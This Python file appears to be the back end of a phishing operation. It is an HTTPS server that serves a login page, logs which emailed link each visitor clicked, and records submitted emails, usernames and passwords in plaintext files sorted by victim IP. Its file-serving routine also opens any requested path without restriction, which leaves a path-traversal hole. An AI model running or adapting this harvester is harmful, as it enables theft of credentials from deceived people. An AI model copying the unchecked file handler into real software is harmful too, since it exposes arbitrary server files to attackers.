from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import ssl
import os
import json

class RequestHandler(BaseHTTPRequestHandler):
    BASE_DIR = '.'

    def do_GET(self):
        resource = self.path.split('?')[0].strip()
        
        if resource == '/login':
            self.send_file('main.html')
        elif resource.startswith('/'):
            file_path = resource[1:]
            self.send_file(file_path)
        else:
            self.send_error(404, "File not found")
            return
        query_params = parse_qs(urlparse(self.path).query)
        email = query_params.get('email', [''])[0]
        self.request_log(email)

    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                username = data.get('username', '')
                password = data.get('password', '')
                email = data.get('email', '')
            except json.JSONDecodeError:
                self.send_response(400)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"error": "Invalid JSON"}')
                return

            print(f'Received credentials: email: {email}, username: {username}, password: {password}')
            self.credentials_log(email, username, password)

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"Credentials received and logged")
        else:
            self.send_error(404, "Not found")

    def send_file(self, file_name):
        try:
            content_type = self.guess_content_type(file_name)
            with open(file_name, 'rb') as file:
                self.send_response(200)
                self.send_header("Content-type", content_type)
                self.send_header("Cache-Control", "no-store, must-revalidate")
                self.end_headers()
                self.wfile.write(file.read())
        except IOError:
            self.send_error(404, "File not found")

    def guess_content_type(self, file_name):
        if file_name.endswith('.html'):
            return 'text/html'
        elif file_name.endswith('.css'):
            return 'text/css'
        elif file_name.endswith('.js'):
            return 'application/javascript'
        elif file_name.endswith('.png'):
            return 'image/png'
        elif file_name.endswith('.ico'):
            return 'image/x-icon'
        else:
            return 'application/octet-stream'

    def request_log(self, email):
        client_ip = self.client_address[0]
        current_date = datetime.now().strftime("%Y-%m-%d")
        log_dir = os.path.join("logs", "logs-link-clicado", client_ip)
        os.makedirs(log_dir, exist_ok=True)
        log_file = os.path.join(log_dir, f"{current_date}.txt")
        with open(log_file, 'a') as file:
            log_entry = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Path: {self.path}, Method: {self.command}, Email: {email}\n"
            file.write(log_entry)

    def credentials_log(self, email, username, password):
        client_ip = self.client_address[0]
        current_date = datetime.now().strftime("%Y-%m-%d")
        log_dir = os.path.join("logs", "logs-credenciales-enviadas", client_ip)
        os.makedirs(log_dir, exist_ok=True)
        log_file = os.path.join(log_dir, f"{current_date}.txt")
        with open(log_file, 'a') as file:
            log_entry = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Email: {email}, Username: {username}, Password: {password}\n"
            file.write(log_entry)


def run(server_class=HTTPServer, handler_class=RequestHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="certs/cert.pem", keyfile="certs/key.pem")
    
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    print(f'Starting HTTPS server on port {port}...')
    httpd.serve_forever()


if __name__ == "__main__":
    run()
